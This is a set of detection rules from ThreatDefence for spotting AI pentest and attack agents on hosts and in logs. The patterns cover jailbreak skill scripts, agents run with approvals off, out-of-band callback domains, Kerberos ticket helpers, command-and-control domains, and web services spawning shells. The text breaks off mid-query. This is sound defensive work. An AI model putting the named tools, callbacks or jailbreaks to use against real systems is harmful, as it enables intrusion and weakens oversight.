query: (process.executable:(*\/virga\-server OR *\/virga\-cli OR *\/virga\-mcp\-stdio OR *\\virga\-server.exe OR *\\virga\-cli.exe OR *\\virga\-server\-windows\-amd64.exe OR *\\virga\-cli\-windows\-amd64.exe OR *\/virga\-server\-linux\-amd64 OR *\/virga\-cli\-linux\-amd64 OR *\/virga\-server\-darwin\-amd64 OR *\/virga\-server\-darwin\-arm64 OR *\/virga\-cli\-darwin\-amd64 OR *\/virga\-cli\-darwin\-arm64)) OR (process.command_line:(*bin\/virga\-server\ \-\-config* OR *bin\/virga\-cli\ \-\-host* OR *bin\/virga\-mcp\-stdio* OR *\-\-server\ virga\-stdio* OR *\-\-server\ virga\-sse* OR *\-\-server\ virga\-streamable*))

author: ThreatDefence
description:
Detects Hermes Agent started with approvals switched off (--yolo, HERMES_YOLO_MODE) and the scripts of its bundled
godmode jailbreak skill. Attackers ran Hermes this way against Thailand's Ministry of Finance (Hunt.io) and with
godmode on DeepSeek (Unit 42).
false_positives: Developers running Hermes unattended in a sandbox
Red teams testing model guardrails
name: Hermes Agent With Approvals Off or Its Jailbreak Skill
query: (process.command_line:/(.*([\/\\ ]))?hermes(\.exe)?(([ ]).*)?|.*hermes_cli.*|.*run_agent\.py.*|.*\/\.hermes\/.*/ AND (process.command_line:(*\-\-yolo* OR *HERMES_YOLO_MODE*))) OR (process.command_line:(*load_godmode.py* OR *auto_jailbreak.py* OR *parseltongue.py* OR *godmode_race.py*))

author: ThreatDefence
description:
Detects numasec, an open-source terminal agent for application security and penetration testing built on OpenCode:
its binary from the numasec-<os>-<arch> npm packages, the npm, bun or Docker commands that install or run it, and the
interactsh-client process its out-of-band tool starts with a log file in the numasec data folder.
false_positives: Security teams and testers who use numasec
name: numasec AI Security Agent on a Host
query: (process.executable:(*\/bin\/numasec OR *\\bin\\numasec.exe)) OR (process.command_line:(*install\ \-g\ numasec* OR *add\ \-g\ numasec* OR *francescostabile\/numasec*)) OR ((process.executable:(*\/interactsh\-client OR *\\interactsh\-client.exe)) AND (process.command_line:(*\/numasec\/log\/int_* OR *\\numasec\\log\\int_*)))

author: ThreatDefence
description:
Detects sapper-v2 driving coding-agent sessions against contest or pentest targets: its tmux sessions (sapper-cmd,
sapper-tui, sapper-fleet), the window command it gives every agent (ending echo DRIVE_PANE_EXITED; exec sleep
infinity), the missions it types into Claude Code with tmux send-keys, the executor system prompt it passes to
claude -p, and its own CLI starting the autonomy loop, the contest loop or the web board. The agents run with
--dangerously-skip-permissions.
false_positives: Contest teams and testers running sapper-v2 or a fork of it
name: sapper-v2 Agent Orchestration on a Host
query: CommandLine:*echo\ DRIVE_PANE_EXITED;\ exec\ sleep\ infinity* OR (CommandLine:*tmux* AND CommandLine:/\s-[st]\s+['"]?sapper-(cmd|tui|fleet)\b/) OR (CommandLine:(*You\ are\ an\ autonomous\ executor\ in\ a\ penetration\-testing\ fact\-graph\ agent\ system* OR *You\ are\ the\ autonomous\ field\ commander\ of\ a\ pentest\ campaign\ \(TSecBench\)* OR *You\ are\ an\ autonomous\ pentest\ operator\ in\ a\ CTF\ benchmark* OR *You\ are\ a\ GENERAL\ \(senior\ operator\)\ on\ challenge* OR *\/opt\/sapper\/docker\/commander\/*)) OR CommandLine:/(^|[\/\s])sapper(\.py)?\s(.*\s)?(auto\s(.*\s)?--(minutes|skip-permissions)|bench\s(.*\s)?--(root|minutes)|view\s(.*\s)?--serve)\b/

author: ThreatDefence
description:
Detects requests carrying the blind XSS callback https://dalfox-xss-test.com that Cyber-AutoAgent's general module
passes to dalfox (-b). The dalfox payloads put it in the query string of the parameters it tests.
false_positives: Authorized tests with Cyber-AutoAgent
Other dalfox users who chose the same callback name
name: Cyber-AutoAgent Dalfox Blind XSS Callback in Web Logs
query: url.query:*dalfox\-xss\-test.com*

author: ThreatDefence
description:
Detects lookups for request-collection and DNS callback services. ARTEX agents posted command output
to webhook.site across hundreds of rotating URLs. These services are legitimate, so scope the rule
to servers, where they have no business purpose.
false_positives: Developers testing webhooks from workstations. Scope to servers
name: DNS Query to Request Collection or DNS Callback Services
query: dns.question.name:/[wW][eE][bB][hH][oO][oO][kK]\.[sS][iI][tT][eE]/ OR (dns.question.name:/.*\.[wW][eE][bB][hH][oO][oO][kK]\.[sS][iI][tT][eE]/ OR dns.question.name:/.*\.[dD][nN][sS][lL][oO][gG]\.[cC][nN]/ OR dns.question.name:/.*\.[iI][nN][tT][eE][rR][aA][cC][tT]\.[sS][hH]/ OR dns.question.name:/.*\.[oO][aA][sS][tT]\.[fF][uU][nN]/ OR dns.question.name:/.*\.[rR][eE][qQ][uU][eE][sS][tT][cC][aA][tT][cC][hH][eE][rR]\.[cC][oO][mM]/ OR dns.question.name:/.*\.[pP][iI][pP][eE][dD][rR][eE][aA][mM]\.[nN][eE][tT]/)

author: ThreatDefence
description:
Detects the files pentest-ai writes on the host that runs it: ~/.pentest-ai/install_id (the per-machine id it puts
in its user agent and X-Request-ID header), mcp-token (the MCP SSE bearer token), aup-consent.txt, credentials
(cloud key), bug bounty program files under programs/, and its findings database pentest-ai/findings.db.
false_positives: Security teams running pentest-ai
name: pentest-ai Install Id, Token or Findings Database Written
query: (TargetFilename:(*\/.pentest\-ai\/install_id OR *\\.pentest\-ai\\install_id OR *\/.pentest\-ai\/mcp\-token OR *\\.pentest\-ai\\mcp\-token OR *\/.pentest\-ai\/aup\-consent.txt OR *\\.pentest\-ai\\aup\-consent.txt OR *\/.pentest\-ai\/credentials OR *\\.pentest\-ai\\credentials)) OR (TargetFilename:(*\/.pentest\-ai\/programs\/* OR *\\.pentest\-ai\\programs\\*)) OR (TargetFilename:(*\/pentest\-ai\/findings.db OR *\\pentest\-ai\\findings.db))

author: ThreatDefence
description:
Detects lookups of out-of-band callback services (interactsh oast.* servers, Burp Collaborator, dnslog.cn and others).
Agents such as Strix use them to confirm blind injection, SSRF and XXE. From a server, a hit means a payload ran there.
false_positives: Authorized penetration tests and bug bounty research against your servers
Security engineers testing interactsh or Burp from workstations
name: DNS Query for an Out-of-Band Testing Domain
query: (dns.question.name:/.*\.[oO][aA][sS][tT]\.[fF][uU][nN]/ OR dns.question.name:/.*\.[oO][aA][sS][tT]\.[pP][rR][oO]/ OR dns.question.name:/.*\.[oO][aA][sS][tT]\.[lL][iI][vV][eE]/ OR dns.question.name:/.*\.[oO][aA][sS][tT]\.[sS][iI][tT][eE]/ OR dns.question.name:/.*\.[oO][aA][sS][tT]\.[oO][nN][lL][iI][nN][eE]/ OR dns.question.name:/.*\.[oO][aA][sS][tT]\.[mM][eE]/ OR dns.question.name:/.*\.[iI][nN][tT][eE][rR][aA][cC][tT]\.[sS][hH]/ OR dns.question.name:/.*\.[oO][aA][sS][tT][iI][fF][yY]\.[cC][oO][mM]/ OR dns.question.name:/.*\.[bB][uU][rR][pP][cC][oO][lL][lL][aA][bB][oO][rR][aA][tT][oO][rR]\.[nN][eE][tT]/ OR dns.question.name:/.*\.[dD][nN][sS][lL][oO][gG]\.[cC][nN]/ OR dns.question.name:/.*\.[cC][eE][yY][eE]\.[iI][oO]/ OR dns.question.name:/.*\.[rR][eE][qQ][uU][eE][sS][tT][rR][eE][pP][oO]\.[cC][oO][mM]/ OR dns.question.name:/.*\.[oO][aA][sS][tT]\.[fF][uU][nN]\./ OR dns.question.name:/.*\.[oO][aA][sS][tT]\.[pP][rR][oO]\./ OR dns.question.name:/.*\.[oO][aA][sS][tT]\.[lL][iI][vV][eE]\./ OR dns.question.name:/.*\.[oO][aA][sS][tT]\.[sS][iI][tT][eE]\./ OR dns.question.name:/.*\.[oO][aA][sS][tT]\.[oO][nN][lL][iI][nN][eE]\./ OR dns.question.name:/.*\.[oO][aA][sS][tT]\.[mM][eE]\./ OR dns.question.name:/.*\.[iI][nN][tT][eE][rR][aA][cC][tT]\.[sS][hH]\./ OR dns.question.name:/.*\.[oO][aA][sS][tT][iI][fF][yY]\.[cC][oO][mM]\./ OR dns.question.name:/.*\.[bB][uU][rR][pP][cC][oO][lL][lL][aA][bB][oO][rR][aA][tT][oO][rR]\.[nN][eE][tT]\./ OR dns.question.name:/.*\.[dD][nN][sS][lL][oO][gG]\.[cC][nN]\./ OR dns.question.name:/.*\.[cC][eE][yY][eE]\.[iI][oO]\./ OR dns.question.name:/.*\.[rR][eE][qQ][uU][eE][sS][tT][rR][eE][pP][oO]\.[cC][oO][mM]\./) AND (NOT (dns.question.name:/[pP][oO][lL][lL][iI][nN][gG]\.[oO][aA][sS][tT][iI][fF][yY]\.[cC][oO][mM]/ OR dns.question.name:/[pP][oO][lL][lL][iI][nN][gG]\.[oO][aA][sS][tT][iI][fF][yY]\.[cC][oO][mM]\./ OR dns.question.name:/[pP][oO][lL][lL][iI][nN][gG]\.[bB][uU][rR][pP][cC][oO][lL][lL][aA][bB][oO][rR][aA][tT][oO][rR]\.[nN][eE][tT]/ OR dns.question.name:/[pP][oO][lL][lL][iI][nN][gG]\.[bB][uU][rR][pP][cC][oO][lL][lL][aA][bB][oO][rR][aA][tT][oO][rR]\.[nN][eE][tT]\./))

author: ThreatDefence
description:
Detects 0security sending traffic to a live target rather than reading code: `0 probe <url>`, which POSTs fixed
prompt-injection, jailbreak, secret-request and tool-execution prompts to a model or agent endpoint (a public
host needs --i-own-this <host>), and `0 scan --scanner nuclei --target-url <url>`, which runs Nuclei with the
flags 0security always passes (-jle into a 0-nuclei-<random> temp folder, -etags intrusive,dos,fuzz, -pt http).
false_positives: Authorized tests of your own model endpoints and web applications with 0security
name: 0security Probe or Nuclei Target Scan Against a Live Endpoint
query: ((process.command_line:(*\ probe\ http* OR *\-\-i\-own\-this\ *)) AND (process.command_line:(*0security* OR *0.js* OR *0\ probe\ *))) OR (process.command_line:*\-\-target\-url\ * AND process.command_line:*\-\-scanner\ nuclei*) OR (process.command_line:*0\-nuclei\-* AND process.command_line:*\-etags\ intrusive,dos,fuzz* AND process.command_line:*\-pt\ http*)

author: ThreatDefence
description:
Detects a Vigilo assessment reaching a web server: the user agent Vigilo-Greybox/1 (authorised security test) on
every grey-box request, the user agent Vigilo-Preflight/1.0 on the reachability check at the start of a white-box
run, the probe host vigilo-probe-<hex>.invalid in redirect parameters, the callback check tokens
vigilo-callback-<hex> and vigilo-control-<hex>, and the soft-404 baseline path /vgl-<hex>. All strings are in the
Vigilo code (certeu/vigilo) at 82c2d353. Vigilo is a CERT-EU tool for assessing your own applications.
false_positives: Agreed Vigilo assessments of your applications
name: Vigilo Assessment Markers in Web Logs
query: (user_agent.original:(Vigilo\-Greybox\/* OR Vigilo\-Preflight\/*)) OR (url.query:(*vigilo\-probe\-* OR *vigilo\-callback\-* OR *vigilo\-control\-*)) OR (url.path:(*vigilo\-callback\-* OR *vigilo\-control\-*))

author: ThreatDefence
description:
Detects IIS, Apache, Tomcat, Java, Node or database processes on Windows starting a command shell,
PowerShell, curl or a common download binary. ARTEX agents used the Windows curl binary to pull
generated scripts and post results to webhook.site.
false_positives: Line-of-business applications that call scripts. Baseline per server
name: Web or Database Service Spawns a Shell or Download Tool on Windows
query: ((process.parent.executable.caseless:(*\\w3wp.exe OR *\\httpd.exe OR *\\tomcat.exe OR *\\php\-cgi.exe OR *\\sqlservr.exe OR *\\mysqld.exe)) OR ((process.parent.executable.caseless:(*\\java.exe OR *\\node.exe)) AND (user.name:(*IIS\ APPPOOL* OR *NETWORK\ SERVICE* OR *LOCAL\ SERVICE*)))) AND (process.executable.caseless:(*\\cmd.exe OR *\\powershell.exe OR *\\pwsh.exe OR *\\curl.exe OR *\\certutil.exe OR *\\bitsadmin.exe OR *\\whoami.exe OR *\\tasklist.exe))

author: ThreatDefence
description:
Detects a lookup of crunch.straylabs.ai, the Phoenix OTLP collector Deadend CLI sends its traces to (prompts, model
output and tool results) when DEADEND_PHOENIX_OTEL_ENABLED is true and PHOENIX_COLLECTOR_ENDPOINT is unset.
Tracing is off by default, so this finds only hosts where the operator turned it on.
false_positives: Staff of the vendor (Stray Labs) or other users of its Phoenix instance
name: Deadend CLI Default Trace Collector Lookup
query: dns.question.name:/[cC][rR][uU][nN][cC][hH]\.[sS][tT][rR][aA][yY][lL][aA][bB][sS]\.[aA][iI]/

author: ThreatDefence
description:
Detects files cyber-harness writes: the agent pid file cyber-agent.pid in the temp folder, the MITM CA of its traffic
hub under .cyber/mitm/, JEV decisions under .cyber/jev/, the inbox store .cyber/active/active.sqlite, tools it
installs under .cyber/arsenal/bin/, the per-command output logs under .cyber/output/, the Web Hub database
cyber-harness.db, and the .aiscan data folder of builds before September 2026.
false_positives: Security teams running cyber-harness for authorized tests
Another tool that keeps its data in a .cyber folder
name: cyber-harness Files Written
query: (TargetFilename:(*\/cyber\-agent.pid OR *\\cyber\-agent.pid OR *\/cyber\-harness.db OR *\\cyber\-harness.db OR *\/.cyber\/mitm\/mitmproxy\-ca\-cert.pem OR *\\.cyber\\mitm\\mitmproxy\-ca\-cert.pem OR *\/.cyber\/active\/active.sqlite OR *\\.cyber\\active\\active.sqlite OR *\/.cyber\/jev\/decisions.jsonl OR *\\.cyber\\jev\\decisions.jsonl)) OR (TargetFilename:(*\/.cyber\/arsenal\/bin\/* OR *\\.cyber\\arsenal\\bin\\* OR *\/.aiscan\/* OR *\\.aiscan\\*)) OR ((TargetFilename:(*\/.cyber\/output\/* OR *\\.cyber\\output\\*)) AND TargetFilename:*.log)

author: ThreatDefence
description:
Detects the OpenHack v0.x pentest agent (PyPI openhack 0.2.4) in web server logs: its out-of-band collector
oob.openhack.com placed in a URL parameter (an SSRF or callback probe), or its canary marker __openhack_test_ (rows
named __openhack_test_probe and __openhack_test_probe_updated, the email __openhack_test_@example.com) in the path
or query, as in GET /rest/v1/<table>?name=eq.__openhack_test_probe after a canary insert.
false_positives: Authorized tests with OpenHack
name: OpenHack Collector or Canary Marker in Web Requests
query: (url.query:(*__openhack_test_* OR *oob.openhack.com*)) OR url.path:*__openhack_test_*

author: ThreatDefence
description:
Detects requests from the Agentic Bug Hunter toolkit (awarexone/Agentic-Bug-Hunter at 82f4512e): the user agents its
scanners and verifiers set (agentic-bug-hunter/<tool>), the user agent of its password spray and wordlist crawl
(Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Bug-Bounty-Research), its WAF analyzer user agent, the WAF
baseline parameter _waftest=, the CRLF canary Set-Cookie:crlftest=1, the DOM XSS hook window.__cbbx and the SAML
control path /saml-control-<number>. All strings are fixed in the scripts.
false_positives: Bug bounty hunters testing your applications with Agentic Bug Hunter under a program's rules
name: Agentic Bug Hunter Scanner Markers in Web Logs
query: user_agent.original:agentic\-bug\-hunter\/* OR user_agent.original:*Bug\-Bounty\-Research OR user_agent.original:*waf\-response\-analyzer\/1.0* OR (url.query:(*_waftest\=* OR *window.__cbbx*)) OR (url.path:(*crlftest\=1* OR *\/saml\-control\-*))

author: ThreatDefence
description:
Detects a DNS lookup for _redamon-verify.<domain>, the TXT record RedAmon reads when a project turns on ownership
verification. On your resolver it means a host of yours runs RedAmon. On the name servers of your own domain it
means someone set up a RedAmon project for that domain.
false_positives: Authorized tests with RedAmon
name: RedAmon Ownership Check Lookup
query: dns.question.name:/_[rR][eE][dD][aA][mM][oO][nN]-[vV][eE][rR][iI][fF][yY]\..*/

author: ThreatDefence
description:
Detects Blitz Strike running: its MCP server over stdio (blitzstrike serve --mcp, started by an AI coding client
through npx -y blitzstrike, bunx blitzstrike, a global npm install or bun run src/index.ts), and its other commands
(install, which writes itself into the MCP settings of every AI client it finds, install-tools, sync-data, doctor).
The npm package is blitzstrike. The entry point is a Node.js script, so on Linux and macOS the image is node or bun and
the script path is on the command line.
false_positives: Security teams and bug bounty researchers running Blitz Strike
/src/index.ts serve --mcp is the generic shape of a Bun MCP server started from source; check the folder name
name: Blitz Strike MCP Server or CLI on a Host
query: (process.command_line:(*blitzstrike\ serve* OR *\/src\/index.ts\ serve\ \-\-mcp* OR *blitzstrike\/dist\/index.js\ serve*)) OR (process.command_line:(*blitzstrike\ install* OR *blitzstrike\ install\-tools* OR *blitzstrike\ sync\-data* OR *blitzstrike\ doctor* OR *npx\ \-y\ blitzstrike* OR *bunx\ blitzstrike* OR *npm\ i\ \-g\ blitzstrike* OR *npm\ install\ \-g\ blitzstrike* OR *bun\ add\ \-g\ blitzstrike* OR *github.com\/shinthink\/blitzstrike*))

author: ThreatDefence
description:
Detects the Codex CLI or the Claude Code CLI started by Mitsu, an AI pentest agent, as its model provider. For
every turn Mitsu starts a loopback MCP server and passes it on the command line: codex exec with
--config mcp_servers.mitsu.url="http://127.0.0.1:<port>/<token>/mcp", or claude -p with
--mcp-config {"mcpServers":{"mitsu":{"type":"http","url":"http://127.0.0.1:<port>/<token>/mcp"}}} and
--allowedTools mcp__mitsu__<tool>. Mitsu's system prompt ("You are Mitsu: the operator's ...") is in the same
command line (developer_instructions for Codex, --system-prompt for Claude Code), and the connection check sends
"Reply exactly MITSU_OK.". The MCP server exposes Mitsu's shell tool and its Red Team Armory tools to the model.
false_positives: Authorized tests, CTF and lab work with Mitsu
name: Codex or Claude Code CLI Started by Mitsu
query: process.command_line:*mcp_servers.mitsu.url\=* OR (process.command_line:(*\"mcpServers\"\:\{\"mitsu\"\:\{\"type\"\:\"http\"* OR *mcp__mitsu__intel_upsert_asset*)) OR (process.command_line:(*You\ are\ Mitsu\:\ the\ operator* OR *You\ are\ Mitsu,\ a\ security\ assessment\ assistant.* OR *Reply\ exactly\ MITSU_OK*))

author: ThreatDefence
description:
Detects /etc/legal being created, which VulnBot does with sudo touch /etc/legal each time it opens its SSH shell on
the Kali host it drives, next to touch ~/.hushlogin and the removal of /etc/motd and /etc/update-motd.d/*
(actions/remote_shell.py:95-103 at 9a12effa). On Kali and other non-Ubuntu hosts nothing else normally creates it.
false_positives: Ubuntu base-files package scripts not run by dpkg itself
Authorized tests with VulnBot
name: VulnBot Login Notice File Created
query: TargetFilename:\/etc\/legal AND (NOT Image:*\/dpkg)

author: ThreatDefence
description:
Detects the way MAPTA runs model-written Python in its sandbox: the code is written to
/home/user/temp_script_<8 hex>.py and run as root with "source .venv/bin/activate && python3 <path>"
(main.py:691-700). Fires inside a local sandbox (Docker or VM) that an EDR watches; a cloud sandbox runs off your
network.
false_positives: Authorized research runs of MAPTA
Other agents or notebooks that use the same temp_script_ naming in an E2B-style sandbox
name: MAPTA Sandbox Python Runner
query: process.command_line:*python3\ \/home\/user\/temp_script_* AND process.command_line:*.py*

author: ThreatDefence
description:
Detects the files Decepticon writes on the host that runs it: the install folder ~/.decepticon/ with its .env,
docker-compose.yml and telemetry/install_id, the Sliver operator config workspace/.sliver-configs/decepticon.cfg,
and the sandbox tmux session logs under workspace/.sessions/.
false_positives: Authorized tests and research with Decepticon
name: Decepticon Configuration, Telemetry ID or C2 Operator Config Written
query: ((TargetFilename:(*\/.decepticon\/* OR *\\.decepticon\\*)) AND (TargetFilename:(*.env OR *docker\-compose.yml OR *install_id OR *litellm.yaml OR *.version))) OR (TargetFilename:(*\/.sliver\-configs\/decepticon.cfg OR *\\.sliver\-configs\\decepticon.cfg)) OR ((TargetFilename:(*\/.decepticon\/workspace\/* OR *\\.decepticon\\workspace\\*)) AND (TargetFilename:(*\/plan\/roe.json OR *\/plan\/opplan.json OR *\\plan\\roe.json OR *\\plan\\opplan.json OR *\/timeline.jsonl OR *\\timeline.jsonl)))

author: ThreatDefence
description:
Detects DNS lookups for command and control domains reported in ARTEX campaigns (VAPOR PANDA
BLOODALCHEMY) and community-reported ARTEX hosting.
false_positives: Unknown
name: DNS Query for Reported ARTEX Infrastructure
query: (dns.question.name:/[nN][gG][iI][nN][xX][mM][yY][sS][qQ][lL]\.[cC][oO][mM]/ OR dns.question.name:/[sS][qQ][lL][sS][eE][rR][vV][eE][rR]-[sS][qQ][lL][iI][tT][eE]\.[cC][oO][mM]/ OR dns.question.name:/[wW][wW][wW]\.[dD][dD][dD][uU][uU][uU][pP][pP][pP]\.[cC][oO][mM]/) OR ((dns.question.name:/[aA][rR][tT][eE][xX]\.[lL][oO][lL]/ OR dns.question.name:/[aA][rR][tT][eE][xX]\.[tT][oO][kK][eE][nN][aA]2[bB]\.[tT][oO][pP]/ OR dns.question.name:/[aA][rR][tT][eE][xX]\.[oO][kK]7777\.[eE][uU]\.[cC][cC]/ OR dns.question.name:/[aA][rR][tT][eE][xX]\.[nN][oO][oO][gG]2[iI][nN][fF][rR][aA]\.[sS][iI][tT][eE]/) OR (dns.question.name:/.*\.[aA][rR][tT][eE][xX]\.[lL][oO][lL]/ OR dns.question.name:/.*\.[aA][rR][tT][eE][xX]\.[tT][oO][kK][eE][nN][aA]2[bB]\.[tT][oO][pP]/ OR dns.question.name:/.*\.[aA][rR][tT][eE][xX]\.[oO][kK]7777\.[eE][uU]\.[cC][cC]/ OR dns.question.name:/.*\.[aA][rR][tT][eE][xX]\.[nN][oO][oO][gG]2[iI][nN][fF][rR][aA]\.[sS][iI][tT][eE]/))

author: ThreatDefence
description:
Detects Ares (dreadnode/ares) using forged or requested Kerberos tickets. Ares writes its cross-realm TGS helper
cross_realm_tgs.py next to the ticket and runs python3 <dir>/cross_realm_tgs.py --in-ccache ... --target-realm ...
(privesc/trust.rs:13,181-235,452-470), and keeps golden, silver and inter-realm tickets in the fixed folder
/tmp/ares-tickets (privesc/delegation.rs:166, privesc/trust.rs:133), which shows up in tool arguments such as
bloodyAD ccache=/tmp/ares-tickets/<name>.ccache.
false_positives: Authorized Ares operations
name: Ares Kerberos Ticket Helpers
query: (process.command_line:*cross_realm_tgs.py* AND process.command_line:*\-\-in\-ccache*) OR process.command_line:*\/tmp\/ares\-tickets\/*

author: ThreatDefence
description:
Detects Pentest Harness (S1N6H/pentest-harness, a rebrand of the dsh agent harness) on a host: the CLI started from a
clone (pnpm dsh web runs node --import tsx/esm apps/cli/src/bin.ts web), any process whose command line carries its
@pentest-harness/ package scope (including its Landlock launcher), and the sandbox wrappers it puts around every
shell command the model runs - bubblewrap with --ro-bind / / --dev /dev --unshare-pid --proc /proc --die-with-parent
followed by bash -c, landlock-run --ro / --rw /dev/null, and on macOS sandbox-exec with the profile
(version 1) (allow default) (deny file-write*). The launch and wrapper strings come from the upstream dsh harness and
also match it and its other forks; the package scope names Pentest Harness itself.
false_positives: Authorized use of Pentest Harness
The upstream dsh harness or another fork (launch and sandbox wrapper branches)
Other tools that wrap commands in bubblewrap with the same mount profile
name: Pentest Harness Launch or Sandboxed Agent Shell
query: (process.command_line:*tsx\/esm* AND process.command_line:*apps\/cli\/src\/bin.ts*) OR process.command_line:*@pentest\-harness\/* OR (process.command_line:*\-\-ro\-bind\ \/\ \/\ \-\-dev\ \/dev\ \-\-unshare\-pid\ \-\-proc\ \/proc\ \-\-die\-with\-parent* AND process.command_line:*\ \-c\ *) OR (process.executable:*\/landlock\-run AND process.command_line:*\-\-ro\ \/\ \-\-rw\ \/dev\/null*) OR process.command_line:*\(version\ 1\)\ \(allow\ default\)\ \(deny\ file\-write*\)*

author: ThreatDefence
description:
Detects an AI agent client (Qwen Code, Kimi CLI, opencode, Claude Code, Codex, Pi) calling DeepSeek, Qwen on
Alibaba DashScope, GLM on BigModel or Z.ai, Kimi, MiniMax, Doubao on Volcano Engine, SiliconFlow or a model gateway such
as OpenRouter. These are the models seen behind agentic attacks (CyberStrikeAI, Cairn). Normal on some developer
machines; review it from servers, container hosts and build agents. Hunt 02 also covers consoles calling these APIs
from Go and Python.
false_positives: Developers using AI agents with these model providers
name: AI Agent Client Calling a Chinese Model API or Model Gateway
query: (user_agent.original:(QwenCode\/* OR KimiCLI\/* OR opencode\/* OR claude\-cli\/* OR codex_exec\/* OR codex_cli_rs\/* OR pi\/0.*)) AND ((url.domain:/[aA][pP][iI]\.[dD][eE][eE][pP][sS][eE][eE][kK]\.[cC][oO][mM]/ OR url.domain:/[dD][aA][sS][hH][sS][cC][oO][pP][eE]\.[aA][lL][iI][yY][uU][nN][cC][sS]\.[cC][oO][mM]/ OR url.domain:/[dD][aA][sS][hH][sS][cC][oO][pP][eE]-[iI][nN][tT][lL]\.[aA][lL][iI][yY][uU][nN][cC][sS]\.[cC][oO][mM]/ OR url.domain:/[dD][aA][sS][hH][sS][cC][oO][pP][eE]-[uU][sS]\.[aA][lL][iI][yY][uU][nN][cC][sS]\.[cC][oO][mM]/ OR url.domain:/[oO][pP][eE][nN]\.[bB][iI][gG][mM][oO][dD][eE][lL]\.[cC][nN]/ OR url.domain:/[aA][pP][iI]\.[zZ]\.[aA][iI]/ OR url.domain:/[aA][pP][iI]\.[mM][oO][oO][nN][sS][hH][oO][tT]\.[cC][nN]/ OR url.domain:/[aA][pP][iI]\.[mM][oO][oO][nN][sS][hH][oO][tT]\.[aA][iI]/ OR url.domain:/[aA][pP][iI]\.[kK][iI][mM][iI]\.[cC][oO][mM]/ OR url.domain:/[cC][oO][dD][eE]\.[kK][iI][mM][iI]\.[cC][oO][mM]/ OR url.domain:/[aA][pP][iI]\.[mM][iI][nN][iI][mM][aA][xX]\.[iI][oO]/ OR url.domain:/[aA][pP][iI]\.[mM][iI][nN][iI][mM][aA][xX]\.[cC][nN]/ OR url.domain:/[aA][pP][iI]\.[mM][iI][nN][iI][mM][aA][xX][iI]\.[cC][oO][mM]/ OR url.domain:/[aA][rR][kK]\.[cC][nN]-[bB][eE][iI][jJ][iI][nN][gG]\.[vV][oO][lL][cC][eE][sS]\.[cC][oO][mM]/ OR url.domain:/[aA][pP][iI]\.[sS][iI][lL][iI][cC][oO][nN][fF][lL][oO][wW]\.[cC][nN]/ OR url.domain:/[aA][pP][iI]\.[sS][iI][lL][iI][cC][oO][nN][fF][lL][oO][wW]\.[cC][oO][mM]/ OR url.domain:/[aA][pP][iI]\.[sS][tT][eE][pP][fF][uU][nN]\.[cC][oO][mM]/ OR url.domain:/[tT][oO][kK][eE][nN][hH][uU][bB]\.[tT][eE][nN][cC][eE][nN][tT][mM][aA][aA][sS]\.[cC][oO][mM]/ OR url.domain:/[qQ][iI][aA][nN][fF][aA][nN]\.[bB][aA][iI][dD][uU][bB][cC][eE]\.[cC][oO][mM]/ OR url.domain:/[aA][pP][iI]\.[xX][iI][aA][oO][mM][iI][mM][iI][mM][oO]\.[cC][oO][mM]/ OR url.domain:/[aA][pP][iI]-[iI][nN][fF][eE][rR][eE][nN][cC][eE]\.[mM][oO][dD][eE][lL][sS][cC][oO][pP][eE]\.[cC][nN]/ OR url.domain:/[oO][pP][eE][nN][rR][oO][uU][tT][eE][rR]\.[aA][iI]/ OR url.domain:/[aA][pP][iI]\.[nN][oO][vV][iI][tT][aA]\.[aA][iI]/ OR url.domain:/[zZ][eE][nN][mM][uU][xX]\.[aA][iI]/) OR (url.domain:/.*\.[aA][pP][iI]\.[dD][eE][eE][pP][sS][eE][eE][kK]\.[cC][oO][mM]/ OR url.domain:/.*\.[dD][aA][sS][hH][sS][cC][oO][pP][eE]\.[aA][lL][iI][yY][uU][nN][cC][sS]\.[cC][oO][mM]/ OR url.domain:/.*\.[dD][aA][sS][hH][sS][cC][oO][pP][eE]-[iI][nN][tT][lL]\.[aA][lL][iI][yY][uU][nN][cC][sS]\.[cC][oO][mM]/ OR url.domain:/.*\.[dD][aA][sS][hH][sS][cC][oO][pP][eE]-[uU][sS]\.[aA][lL][iI][yY][uU][nN][cC][sS]\.[cC][oO][mM]/ OR url.domain:/.*\.[oO][pP][eE][nN]\.[bB][iI][gG][mM][oO][dD][eE][lL]\.[cC][nN]/ OR url.domain:/.*\.[aA][pP][iI]\.[zZ]\.[aA][iI]/ OR url.domain:/.*\.[aA][pP][iI]\.[mM][oO][oO][nN][sS][hH][oO][tT]\.[cC][nN]/ OR url.domain:/.*\.[aA][pP][iI]\.[mM][oO][oO][nN][sS][hH][oO][tT]\.[aA][iI]/ OR url.domain:/.*\.[aA][pP][iI]\.[kK][iI][mM][iI]\.[cC][oO][mM]/ OR url.domain:/.*\.[cC][oO][dD][eE]\.[kK][iI][mM][iI]\.[cC][oO][mM]/ OR url.domain:/.*\.[aA][pP][iI]\.[mM][iI][nN][iI][mM][aA][xX]\.[iI][oO]/ OR url.domain:/.*\.[aA][pP][iI]\.[mM][iI][nN][iI][mM][aA][xX]\.[cC][nN]/ OR url.domain:/.*\.[aA][pP][iI]\.[mM][iI][nN][iI][mM][aA][xX][iI]\.[cC][oO][mM]/ OR url.domain:/.*\.[aA][rR][kK]\.[cC][nN]-[bB][eE][iI][jJ][iI][nN][gG]\.[vV][oO][lL][cC][eE][sS]\.[cC][oO][mM]/ OR url.domain:/.*\.[aA][pP][iI]\.[sS][iI][lL][iI][cC][oO][nN][fF][lL][oO][wW]\.[cC][nN]/ OR url.domain:/.*\.[aA][pP][iI]\.[sS][iI][lL][iI][cC][oO][nN][fF][lL][oO][wW]\.[cC][oO][mM]/ OR url.domain:/.*\.[aA][pP][iI]\.[sS][tT][eE][pP][fF][uU][nN]\.[cC][oO][mM]/ OR url.domain:/.*\.[tT][oO][kK][eE][nN][hH][uU][bB]\.[tT][eE][nN][cC][eE][nN][tT][mM][aA][aA][sS]\.[cC][oO][mM]/ OR url.domain:/.*\.[qQ][iI][aA][nN][fF][aA][nN]\.[bB][aA][iI][dD][uU][bB][cC][eE]\.[cC][oO][mM]/ OR url.domain:/.*\.[aA][pP][iI]\.[xX][iI][aA][oO][mM][iI][mM][iI][mM][oO]\.[cC][oO][mM]/ OR url.domain:/.*\.[aA][pP][iI]-[iI][nN][fF][eE][rR][eE][nN][cC][eE]\.[mM][oO][dD][eE][lL][sS][cC][oO][pP][eE]\.[cC][nN]/ OR url.domain:/.*\.[oO][pP][eE][nN][rR][oO][uU][tT][eE][rR]\.[aA][iI]/ OR url.domain:/.*\.[aA][pP][iI]\.[nN][oO][vV][iI][tT][aA]\.[aA][iI]/ OR 